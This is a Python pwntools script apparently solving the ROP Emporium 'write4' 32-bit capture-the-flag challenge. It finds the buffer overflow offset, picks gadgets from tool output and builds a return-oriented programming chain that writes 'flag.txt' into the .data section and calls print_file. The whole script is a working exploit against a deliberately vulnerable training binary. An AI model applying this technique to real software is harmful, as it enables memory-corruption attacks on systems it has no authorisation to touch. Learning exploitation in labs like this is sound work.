from pwn import *

# On completing our usual checks for interesting strings and symbols in
# this binary we're confronted with the stark truth that our favourite
# string "/bin/cat flag.txt" is not present this time. Although you'll
# see later that there are other ways around this problem, such as
# resolving dynamically loaded libraries and using the strings present
# in those, we'll stick to the challenge goal which is learning how to
# get data into the target process's virtual address space via the magic
# of ROP.

# Things have been rearranged a little for this challenge; the printing
# logic has been moved into a separate library in an attempt to mitigate
# the alternate solution that is possible in the callme challenge. The
# stack smash also takes place in a function within that library, but
# don't worry this will have no effect on your ROP chain.  Important!  A
# PLT entry for a function named print_file() exists within the
# challenge binary, simply call it with the name of a file you wish to
# read (like "flag.txt") as the 1st argument.

# Hopefully you've realised that ROP is just a form of arbitrary code
# execution and if we get creative we can leverage it to do things like
# write to or read from memory. The question we need to answer is: what
# mechanism are we going to use to solve this problem? Is there any
# built-in functionality to do the writing or do we need to use gadgets?
# In this challenge we won't be using built-in functionality since
# that's too similar to the previous challenges, instead we'll be
# looking for gadgets that let us write a value to memory such as mov
# [reg], reg.

# Perhaps the most important thing to consider in this challenge is
# where we're going to write our "flag.txt" string. Use rabin2 or
# readelf to check out the different sections of this binary and their
# permissions. Learn a little about ELF sections and their
# purpose. Consider how much space each section might give you to work
# with and whether corrupting the information stored at these locations
# will cause you problems later if you need some kind of stability from
# this program.

# Once you've figured out how to write your string into memory and where
# to write it, go ahead and call print_file() with its location as its
# only argument. You could consider wrapping your write gadgets in
# helper a function; if you can write a 4 or 8 byte value to a location
# in memory, you could craft a function (e.g. in Python using pwntools)
# that takes a string and a memory location and returns a ROP chain that
# will write that string to your chosen location. Crafting templates
# like this will make your life much easier in the long run. As ever,
# with the MIPS challenge don't forget about the branch delay slot.

# Load binary into pwntools
elf = context.binary = ELF('write432')

# the following is if you want to debug this without being in a tmux.
# context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

# the following is for debugging in tmux.
context.terminal = ['tmux', 'splitw', '-h']

# Enable verbose logging
context.log_level = 'debug'

# Figure out length of buffer
io = process(elf.path)

# We will send a 'cyclic' (de Bruijn) pattern which overwrites the return
# address on the stack.  The value 128 is longer than the buffer.
io.sendline(cyclic(128))

# Wait for the process to crash
# if this does not work, check /proc/sys/kernel/core_pattern
# e.g. echo "/tmp/core.%e.%p.%h.%t" > /proc/sys/kernel/core_pattern
# or simply echo "/tmp/core" > /proc/sys/kernel/core_pattern
io.wait()

# Open up the corefile
core = io.corefile

# Print out the address of ESP at the time of crashing
stack = core.esp
info("%#x stack", stack)

# Read EIP, which will be some of our cyclic data.
# With this snippet of the pattern, we know the exact offset from
# the beginning of our controlled data to the return address.
pattern = core.fault_addr
info("%r pattern", pattern)

# print length of the buffer
info("%s bufferlen", cyclic_find(core.fault_addr))


# Next, I need to find a gadget to write.

# $ ROPgadget --binary write432 --only "mov|pop|ret"
# Gadgets information
# ============================================================
# 0x080484e7 : mov al, byte ptr [0xc9010804] ; ret
# 0x08048543 : mov dword ptr [edi], ebp ; ret
# 0x08048381 : mov ebx, 0x81000000 ; ret
# 0x08048423 : mov ebx, dword ptr [esp] ; ret
# 0x080485ab : pop ebp ; ret
# 0x080485a8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
# 0x0804839d : pop ebx ; ret
# 0x080485aa : pop edi ; pop ebp ; ret
# 0x080485a9 : pop esi ; pop edi ; pop ebp ; ret
# 0x08048386 : ret
# 0x0804849e : ret 0xeac1
# Unique gadgets found: 11

# The gadget @ 0x08048543 looks nice. mov dword ptr [edi], ebp ; ret
# It writes the content of ebp into the memory referenced by edi

# But how can we write to edi and ebp? There is another useful gadget
# in there.
# 0x080485aa : pop edi ; pop ebp ; ret

# Where should we write to, in order that flag.txt is printed?

# [0x080483f0]> afl
# 0x080483f0    1 50           entry0
# 0x08048423    1 4            fcn.08048423
# 0x080483c0    1 6            sym.imp.__libc_start_main
# 0x0804837c    3 35           sym._init
# 0x08048440    1 4            sym.__x86.get_pc_thunk.bx
# 0x080483e0    1 6            sym..plt.got
# 0x080485b4    1 20           sym._fini
# 0x08048450    4 50   -> 41   sym.deregister_tm_clones
# 0x08048490    4 58   -> 54   sym.register_tm_clones
# 0x080484d0    3 34   -> 31   sym.__do_global_dtors_aux
# 0x08048500    1 6            entry.init0
# 0x0804852a    1 25           sym.usefulFunction
# 0x080483d0    1 6            sym.imp.print_file
# 0x080485b0    1 2            sym.__libc_csu_fini
# 0x08048550    4 93           sym.__libc_csu_init
# 0x08048430    1 2            sym._dl_relocate_static_pie
# 0x08048506    1 36           main
# 0x080483b0    1 6            sym.imp.pwnme
# [0x080483f0]> pdf @sym.usefulFunction
# ┌ 25: sym.usefulFunction ();
# │           0x0804852a      55             push ebp
# │           0x0804852b      89e5           mov ebp, esp
# │           0x0804852d      83ec08         sub esp, 8
# │           0x08048530      83ec0c         sub esp, 0xc
# │           0x08048533      68d0850408     push str.nonexistent        ; 0x80485d0 ; "nonexistent"
# │           0x08048538      e893feffff     call sym.imp.print_file
# │           0x0804853d      83c410         add esp, 0x10
# │           0x08048540      90             nop
# │           0x08048541      c9             leave
# └           0x08048542      c3             ret

# So it may suggest to write "flag.txt" @ 0x80485d0.
# In fact, i did this only to find out that the memory section @
# 0x80485d0 is only readable..

# Next approach:
# $ readelf -e write432
# Section Headers:
#   [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
#   [ 0]                   NULL            00000000 000000 000000 00      0   0  0
#   [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
#   [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
#   [ 3] .note.gnu.bu[...] NOTE            08048188 000188 000024 00   A  0   0  4
#   [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00003c 04   A  5   0  4
#   [ 5] .dynsym           DYNSYM          080481e8 0001e8 0000b0 10   A  6   1  4
#   [ 6] .dynstr           STRTAB          08048298 000298 00008b 00   A  0   0  1
#   [ 7] .gnu.version      VERSYM          08048324 000324 000016 02   A  5   0  2
#   [ 8] .gnu.version_r    VERNEED         0804833c 00033c 000020 00   A  6   1  4
#   [ 9] .rel.dyn          REL             0804835c 00035c 000008 08   A  5   0  4
#   [10] .rel.plt          REL             08048364 000364 000018 08  AI  5  23  4
#   [11] .init             PROGBITS        0804837c 00037c 000023 00  AX  0   0  4
#   [12] .plt              PROGBITS        080483a0 0003a0 000040 04  AX  0   0 16
#   [13] .plt.got          PROGBITS        080483e0 0003e0 000008 08  AX  0   0  8
#   [14] .text             PROGBITS        080483f0 0003f0 0001c2 00  AX  0   0 16
#   [15] .fini             PROGBITS        080485b4 0005b4 000014 00  AX  0   0  4
#   [16] .rodata           PROGBITS        080485c8 0005c8 000014 00   A  0   0  4
#   [17] .eh_frame_hdr     PROGBITS        080485dc 0005dc 000044 00   A  0   0  4
#   [18] .eh_frame         PROGBITS        08048620 000620 000114 00   A  0   0  4
#   [19] .init_array       INIT_ARRAY      08049efc 000efc 000004 04  WA  0   0  4
#   [20] .fini_array       FINI_ARRAY      08049f00 000f00 000004 04  WA  0   0  4
#   [21] .dynamic          DYNAMIC         08049f04 000f04 0000f8 08  WA  6   0  4
#   [22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
#   [23] .got.plt          PROGBITS        0804a000 001000 000018 04  WA  0   0  4
#   [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
#   [25] .bss              NOBITS          0804a020 001020 000004 00  WA  0   0  1
#   [26] .comment          PROGBITS        00000000 001020 000029 01  MS  0   0  1
#   [27] .symtab           SYMTAB          00000000 00104c 000440 10     28  47  4
#   [28] .strtab           STRTAB          00000000 00148c 000211 00      0   0  1
#   [29] .shstrtab         STRTAB          00000000 00169d 000105 00      0   0  1
# Key to Flags:
#   W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
#   L (link order), O (extra OS processing required), G (group), T (TLS),
#   C (compressed), x (unknown), o (OS specific), E (exclude),
#   p (processor specific)

# Let's try the start of the data segment @ 0804a018.
# Should be big enough with its 8 bytes for "flag.txt"


# As we can only write four bytes each, we first write "flag" and then ".txt".

# My idea for the stack is thus as follows:
# +-------------------------+
# |  pop edi; pop ebp;ret   | # 0x080485aa
# +-------------------------+
# |        data_start       | # 0x0804a018
# +-------------------------+
# |       0x67616C66        | # "flag" (in reverse)
# +-------------------------+
# | mov DWORD PTR [edi],ebp | # 0x08048543
# +-------------------------+
# |  pop edi; pop ebp;ret   | # 0x0804a040
# +-------------------------+
# |    data_start + 0x4     | # 0x0804a018+0x4
# +-------------------------+
# |       0x7478742E        | # ".txt"
# +-------------------------+
# | mov DWORT PTR [edi],ebp | # 0x08048543 : mov dword ptr [edi], ebp ; ret
# +-------------------------+


# use pwnlib for crafting the stack
rop = ROP(elf)

poppop = 0x080485aa  # pop edi; pop ebp;ret
data_start = elf.symbols.data_start  # 0x0804a018
mov = 0x08048543  # mov DWORD PTR [edi],ebp

# write "flag"
rop = b""
rop += p32(poppop)
rop += p32(data_start)
rop += p32(0x67616C66)  # "flag" (in reverse)
rop += p32(mov)

# write ".txt"
rop += p32(poppop)
rop += p32(data_start+0x4)
rop += p32(0x7478742E)  # ".txt"
rop += p32(mov)

# lastly, we need to call sym.imp.print_file with data_start as argument
rop += p32(elf.symbols.plt.print_file)  # 0x080483d0
rop += b"AAAA" # pointer to the next stack frame. We do not need that.
rop += p32(elf.symbols.data_start)

payload = flat({
    pattern: rop
})


# How to debug a rop chain?
# According to the documentation, the following should work:
# gdb.attach(io, gdbscript='continue')
# But I was unable to fgiure out when I should call it.
# So, I write the payload to a file and then open gdb manually
#

with open("payload", "wb") as f:
    f.write(payload)

# (venv3) $ gdb - qde write432
# GEF for linux ready, type `gef' to start, `gef config' to configure
# 96 commands loaded for GDB Fedora 11.1-5.fc34 using Python engine 3.9
# Reading symbols from write432...
# (No debugging symbols found in write432)
# gef➤  run < payload
# Starting program: / home/...04_write4/write432 < payload

# Send the payload to a new copy of the process
io = process(elf.path)
# io.wait()
io.sendline(payload)
# gdb.attach(io, gdbscript='continue')
# io.interactive()
# io.wait()
io.recvuntil("Thank you!\n")
flag = io.recvline()
print(flag)
